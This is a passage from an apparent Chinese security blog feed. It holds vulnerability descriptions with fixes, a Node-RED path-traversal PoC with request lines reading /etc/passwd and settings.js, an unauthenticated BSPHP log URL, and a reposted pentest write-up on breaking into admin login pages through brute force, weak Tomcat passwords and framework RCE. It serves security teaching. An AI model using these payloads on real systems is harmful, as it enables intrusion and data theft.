href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p>　　<strong>修复建议</strong></p><p>　　1、对传入的对象进行严格的过滤检查</p><p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p><h2 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h2><p>　　<strong>漏洞描述</strong></p><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><p>　　<strong>修复建议</strong></p><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p><p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p><p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p><p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p><h2 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p><h2 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><p>　　<strong>修复建议</strong></p><p>　　对用户的输入内容进行严格的过滤。</p><h2 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h2><p>　　<strong>漏洞描述</strong></p><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><p>　　<strong>修复建议</strong></p><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p><p>　　2、白名单规定跳转链接</p><h2 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h2><p>　　<strong>漏洞描述</strong></p><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><p>　　<strong>修复建议</strong></p><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p><p>　　2、使用https来保证传输的安全。</p><h2 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h2><p>　　<strong>漏洞描述</strong></p><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p><p>　　2、发现并及时修复已存在的漏洞。</p><p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p><h2 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><p>　　<strong>修复建议</strong></p><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p><p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p><h2 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><p>　　<strong>修复建议</strong></p><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p><p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p><p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p><p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p><h2 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p><p>　　<strong>修复建议</strong></p><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p><h2 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><p>　　<strong>修复建议</strong></p><p>　　1、删除phpinfo 函数。</p><p>　　2、若文件无用可直接删除。 </p><h2 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><p>　　<strong>修复建议</strong></p><p>　　修改Windows配置，关闭短文件名功能。</p><p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p><p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p><p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p><p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p><p>　　3）升级net framework 至4.0以上版本。</p><p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back，然后删除原文件夹D:\\www，再重命名D:\\www.back到D:\\www。如果不重新复制，已经存在的短文件名则是不会消失的。" target="_blank" rel="noopener">www.back，然后删除原文件夹D:\\www，再重命名D:\\www.back到D:\\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p><h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><p>　　<strong>修复建议</strong></p><p>　　1、自定义错误页面或使用统一的错误页面提示。</p><h2 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><p>　　<strong>修复建议</strong></p><p>　　1、删除样例文件</p><p>　　2、限制文件访问权限</p><h2 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><p>　　<strong>修复建议</strong></p><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p><h2 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p><p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p><h2 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><p>　　<strong>修复建议</strong></p><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p><p>　　2、限制uddiexplorer应用只能内网访问</p><h2 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p><p>　　2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</p><h2 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><h2 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</p><h2 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p><p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p><p>　　4、修改WEB-INF/classes目录下的配置</p><p>　　在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p><p>　　&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p><p>　　在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p><p>　　struts.messages.upload.error.InvalidContentTypeException=1</p><h2 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p><h2 id="37-redis相关漏洞修复"><a href="#37-redis相关漏洞修复" class="headerlink" title="37.redis相关漏洞修复"></a>37.redis相关漏洞修复</h2><p>补充来自博客园：@梦猩魂</p><p>完善来自博客园：@我超怕的</p><p><strong>漏洞描述</strong></p><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p><p><strong>安全建议</strong></p><p>1.禁用一些高危命令</p><p>　　常见如：flushdb，flushall，config，keys 等</p><p>2.以低权限运行 Redis 服务</p><p>3.为 Redis 添加密码验证</p><p>4.禁止外网访问 Redis</p><p>5.保证 authorized_keys 文件的安全</p><p>俗人昭昭，我独昏昏。俗人察察，我独闷闷。</p>]]></content>
      
      
      <categories>
          
          <category> 文档 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node-RED ui_base 任意文件读取漏洞</title>
      <link href="/2021/07/17/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/17/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-RED-ui-base-任意文件读取漏洞"><a href="#Node-RED-ui-base-任意文件读取漏洞" class="headerlink" title="Node-RED ui_base 任意文件读取漏洞"></a>Node-RED ui_base 任意文件读取漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Node-RED 在/nodes/ui_base.js中，URL与’/ui_base/js/*’匹配，然后传递给path.join，</p><p>缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote><p>[!NOTE]</p><p>Node-RED</p></blockquote><h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote><p>[!NOTE]</p><p>title=”Node-RED”</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问页面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/346971a9318cc350e4a2e701ae15460c.png" alt="image-20210701185722667"></p><p>验证POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line">/ui_base/js/..%2f..%2f..%2f..%2fsettings.js</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0b7ef8b4a6f8c62354d491da385c0da6.png" alt="image-20210701185812622"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7e922f160ad22a13c67e04b91230f150.png" alt="image-20210704171045540"></p>]]></content>
      
      
      <categories>
          
          <category> 任意文件读取 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BSPHP存在未授权访问</title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="BSPHP存在未授权访问"><a href="#BSPHP存在未授权访问" class="headerlink" title="BSPHP存在未授权访问"></a>BSPHP存在未授权访问</h1><p>该处泄漏的⽤户名和用户登陆 IP</p><p>URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;</span><br></pre></td></tr></table></figure><p>直接进行访问即可获得如下数据</p><p><img src="./BSPHP存在未授权访问/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈对后台登录页面的渗透测试</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>本来是想写漏洞文章的，但是看见这篇文章，觉得这篇文章对渗透经验少的人可能会有点帮助，是可以让新手有所收获的文章，所以放上博客</p><h2 id="原文：谈谈对后台登录页面的渗透测试"><a href="#原文：谈谈对后台登录页面的渗透测试" class="headerlink" title="原文：谈谈对后台登录页面的渗透测试"></a>原文：<a href="https://www.anquanke.com/post/id/185426" target="_blank" rel="noopener">谈谈对后台登录页面的渗透测试</a></h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有些朋友在渗透时扫描到后台登陆界面，却不知道如何入手。最近刚好在某公司做渗透实习，对目标固定的系统渗透有些体会。因此这里讲一下对网站后台登陆界面的渗透思路，希望能为大家提供一些帮助。</p><h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><p>本人在进入登陆界面时，一般都是先用万能密码什么的测下输入框有没有注入（现在很少见了）。如果没有，那就先拿admin，123456什么的测试下弱口令，不求运气爆棚一下就猜到密码。主要是看下回显，查看是否存在账号锁定策略，密码不正确，不存在此用户名等信息，以便于尝试遍历可能存在的用户名。没验证码就上爆破工具，有验证码的话看看能不能绕过,实在不行手工测几个账号密码碰碰运气。</p><h2 id="0x02-爆破"><a href="#0x02-爆破" class="headerlink" title="0x02 爆破"></a>0x02 爆破</h2><p>如果没验证码阻碍，那爆破没什么好说的，拿个好字典，直接干就是了。</p><p>不过注意下有时密码传输会使用md5或者base64之类的加密，这时除了自己写脚本外，可以使用burpsuite的intruder模块<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6thmeqhnfj30v10l2tap.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6thmw22wqj30uk0bxdgp.jpg" alt><br>爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。</p><h2 id="0x03-扫目录"><a href="#0x03-扫目录" class="headerlink" title="0x03 扫目录"></a>0x03 扫目录</h2><p>目录扫描也是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。</p><p>像后台登陆的网址看多了，常规的路径像<a href="http://www.xxx.com/admin/login.aspx(.php)" target="_blank" rel="noopener">www.xxx.com/admin/login.aspx(.php)</a></p><p>老司机甚至不用御剑什么的工具跑，就能直接猜到。</p><p>一般碰到下面这种情况，可采用fuzz大法。一层一层fuzz，尝试寻找可利用的信息。漏洞银行有一期衬衫的视频fuzz讲得很好。他用的工具是wfuzz，感觉不错，感兴趣的可以去看看。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6thndmouej30up0ekgnf.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thno21asj30tt0f1abo.jpg" alt></p><p><strong>这里给大家讲一下我做授权渗透的一个案列:</strong></p><p>一般给客户的后台系统做渗透，客户都会给个测试账号，除了测登陆界面外，还测下后台的功能模块。但这次当我问客户要账号密码时，客户回：你们不是要模拟黑客做渗透测试吗，那就自己打进去啊。( ╯□╰ )好吧，作为实习生的我也只能硬着头皮刚登陆界面了。</p><p>先看了下链接，发现是Java站，且链接是.do结尾，但struct2工具试了下没成功。<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tho3of7mj30uj08bgmz.jpg" alt><br>看了下登陆界面，有验证码，网站看去的版本也挺新的，感觉不太好搞。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thoghp6aj30if096t9c.jpg" alt><br>测下注入无果，于是抓包看下验证码是否可以绕过或者不变，结果这个验证码很称职，爆破不了。验证码辨认还算清楚，不过验证码识别，总觉得不太靠谱。。。等绝望了找不到洞再试吧。于是去扫了下目录。诶，发现有好东西。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thovfgsjj30au087767.jpg" alt><br>首先扫到了一个services服务路径<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thpfty87j30u10d276h.jpg" alt><br>知道了Apache Axis组件的版本信息<br><img src="https://imgchr.com/i/ntKnXQ" alt><br>然后马上想到这个组件当时刚爆出一个RCE漏洞</p><p>poc链接：<a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="noopener">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a></p><p>结果试了下没成功。然后再尝试了四月份CNVD看到的RCE漏洞也无果。</p><p>还扫出了一个ckfinder编辑器<br><a href="http://xxx.xxx.com/ckfinder/ckfinder.html" target="_blank" rel="noopener">http://xxx.xxx.com/ckfinder/ckfinder.html</a></p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4gao3lj30ty0cqwg5.jpg" alt><br>一看，我滴乖乖，难道已经有黑客搞进去了？</p><p>赶紧网上找了下这个版本有存在什么漏洞，并尝试文件上传绕过。但很遗憾，这个网站并不存在解析漏洞，利用不了，文件上传也没绕过。不过令人庆幸的是，黑客应该也没有利用成功。</p><p>。。。</p><p>又挖了一段时间，同事竟然说他拿shell了！</p><p>what?<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4wgekgj308g083jtx.jpg" alt><br>发现他扫目录扫到了<a href="http://xxx.xx.com/manager/html" target="_blank" rel="noopener">http://xxx.xx.com/manager/html</a><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti62iseaj30sw09l421.jpg" alt><br>然后一个admin/123456弱口令进入tomcat后台，然后传war包成功拿到shell<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ti6h08nrj30pi07bt97.jpg" alt><br>看了这波操作久久无语，看来我的字典太差，tomcat目录都没扫出来。还有弱口令漏洞，真的很无敌。</p><h2 id="0x04-框架漏洞"><a href="#0x04-框架漏洞" class="headerlink" title="0x04 框架漏洞"></a>0x04 框架漏洞</h2><p>对一些CMS，已经比较成熟了，漏洞确实不好挖。如果网上（乌云，seebug，搜索引擎等）的历史漏洞没有复现成功，那一般情况下就只能寻找下逻辑漏洞、网站管理员配置错误或者弱口令什么的。</p><p>对于一些不知名的框架，一般也可通过登陆界面底下的声明中找到开发公司和产品版本时间。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti7a4kvuj30g901sjrn.jpg" alt></p><p>在网上找找此公司产品是否爆出过漏洞。若是开源的框架，还可下载源码进行代码审计寻找漏洞。</p><p>像java的站，登陆页面是.do或.action的网址。可尝试下 struts2 命令执行漏洞，本人一般使用安恒的S2漏洞验证工具。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6ti7r0kimj30vk0o4ak5.jpg" alt><br>又如thinkphp的CMS，可尝试下是否存在相应版本的命令执行漏洞。本人曾在邮储银行的一个系统登陆界面挖到tp5命令执行漏洞拿到shell，补天评了1700元。</p><p>emmmm,当然厂商说漏洞无影响给拒了就是另一回事了……<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti83uxffj307y05ojsk.jpg" alt></p><h2 id="0x05-弱口令"><a href="#0x05-弱口令" class="headerlink" title="0x05 弱口令"></a>0x05 弱口令</h2><p>可能有些小伙伴对弱口令嗤之以鼻，觉得它没有技术含量，但其实不然，结合社工，它的作用和危害可能比其他漏洞更大，希望大家重视。</p><p>刚巧最近有去公安厅复测6月HW的漏洞，检测漏洞是否修复。几十份报告，原以为要花很长时间，但结果却是：差不多半小时就完成了，且部分时间是花在输入网址上（报告不给拷到自己电脑上，只能看着公安厅电脑的报告手打网址）。</p><p>耗时少的其中一个原因是漏洞有八、九层的漏洞都是弱口令，其中大部分漏洞还都是部委级别的系统，所以测的很快。虽然hw期间比较特殊，还是比例这么大还是挺能说明问题的。</p><p><strong>以下是某大佬对14年底12306泄露密码的统计分析</strong></p><p>哈哈，可以发现我国还是对数字情有独钟，国外的top100弱口令还是不适合我大天朝的国情。很少有password,football之类的英文密码。</p><p>密码中包含有 123456 数字的，出现 3236 次<br>密码中包含有 123 数字的，出现 11213 次<br>密码中包含有 520 数字的，出现 4549 次<br>密码中包含有 1314 数字的，出现 3113 次<br>密码中包含有 aini 的，出现 877 次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 